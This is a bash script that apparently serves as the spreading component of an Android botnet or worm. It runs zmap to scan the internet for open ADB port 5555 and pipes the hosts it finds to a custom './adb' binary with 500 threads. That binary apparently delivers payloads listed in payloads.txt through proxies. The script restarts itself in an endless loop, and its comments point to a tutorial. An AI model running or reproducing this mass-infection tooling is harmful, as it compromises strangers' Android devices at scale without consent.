#!/bin/bash
# Keeps zmap + adb coupled: adb starts first on a FIFO; if adb dies, zmap is killed.
# Do NOT run zmap alone — use this script (see tut.txt).
set -uo pipefail
ROOT="$(cd "$(dirname "$0")" && pwd)"
cd "$ROOT"

PORT="${ADB_PORT:-5555}"
THREADS="${ADB_THREADS:-500}"
RESTART_SEC="${SPREAD_RESTART_SEC:-3}"
ADB_BIN="${ADB_BIN:-./adb}"
PIPE=""

if [[ ! -x "$ADB_BIN" ]]; then
  echo "[spread] missing executable: $ADB_BIN" >&2
  exit 1
fi

cleanup_pipe() {
  [[ -n "$PIPE" && -p "$PIPE" ]] && rm -f "$PIPE"
  PIPE=""
}

kill_pipeline() {
  pkill -f "zmap -p ${PORT} " 2>/dev/null || true
  pkill -f "${ADB_BIN} ${PORT} " 2>/dev/null || true
  pkill -f "./adb ${PORT} " 2>/dev/null || true
  cleanup_pipe
  sleep 1
}

trap 'kill_pipeline; exit 130' INT TERM

read -ra ZMAP_TAIL <<< "${SPREAD_ZMAP_ARGS:-} $*"

while true; do
  kill_pipeline
  PIPE="$(mktemp -u "${ROOT}/.spread.XXXXXX")"
  mkfifo "$PIPE"

  echo "[spread] $(date -Is) starting (fifo): zmap -p ${PORT} -> ${ADB_BIN} -j ${THREADS}"
  set +e
  "${ADB_BIN}" "${PORT}" -j "${THREADS}" < "$PIPE" &
  adb_pid=$!
  sleep 0.3
  if ! kill -0 "$adb_pid" 2>/dev/null; then
    wait "$adb_pid" 2>/dev/null
    adb_ec=$?
    echo "[spread] adb exited immediately (code=${adb_ec}) — check proxies.txt / payloads.txt" >&2
    cleanup_pipe
    sleep "${RESTART_SEC}"
    continue
  fi

  zmap -p "${PORT}" -o - "${ZMAP_TAIL[@]}" > "$PIPE" 2>>"${ROOT}/zmap.log" &
  zmap_pid=$!

  wait "$adb_pid"
  adb_ec=$?
  kill "$zmap_pid" 2>/dev/null || true
  wait "$zmap_pid" 2>/dev/null
  zmap_ec=$?
  cleanup_pipe
  set -e

  echo "[spread] $(date -Is) stopped (zmap=${zmap_ec} adb=${adb_ec}) — restart in ${RESTART_SEC}s"
  sleep "${RESTART_SEC}"
done
